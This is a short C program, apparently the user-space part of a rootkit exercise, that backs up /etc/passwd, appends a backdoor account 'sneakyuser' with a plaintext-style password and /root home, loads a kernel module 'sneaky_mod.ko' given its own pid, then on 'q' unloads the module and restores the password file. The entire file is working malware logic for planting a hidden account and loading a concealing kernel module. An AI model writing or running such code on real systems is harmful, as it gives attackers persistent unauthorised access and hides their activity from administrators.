#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <termios.h> 

int main() {
    printf("sneaky_process pid = %d\n", getpid());

    // Copy password file
    if(fork() == 0) {
        execl("/bin/cp", "/bin/cp", "/etc/passwd", "/tmp/passwd", (char*)NULL);
    }
    wait(NULL);
    printf("Copied password file\n");

    // Append line
    FILE * passwordFile = fopen("/etc/passwd", "a");
    fprintf(passwordFile, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    printf("Appened line to password file");

    // Load module
    char arg[20];
    sprintf(arg, "pid=%d", getpid());
    if(fork() == 0) {
        execl("/bin/insmod", "/bin/insmod", "sneaky_mod.ko", arg, (char*)NULL);
    }
    wait(NULL);
    printf("Loaded module");

    // Enter loop
    static struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    while(getchar() != 'q') {}
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);

    // Unload module
    if(fork() == 0) {
        execl("/bin/rmmod", "/bin/rmmod", "sneaky_mod", (char*)NULL);
    }
    wait(NULL);
    printf("Unloaded module");

    // Restore password file
    if(fork() == 0) {
        execl("/bin/cp", "/bin/cp", "/tmp/passwd", "/etc/passwd", (char*)NULL);
    }
    wait(NULL);
    printf("Restored password file");


    return EXIT_SUCCESS;
}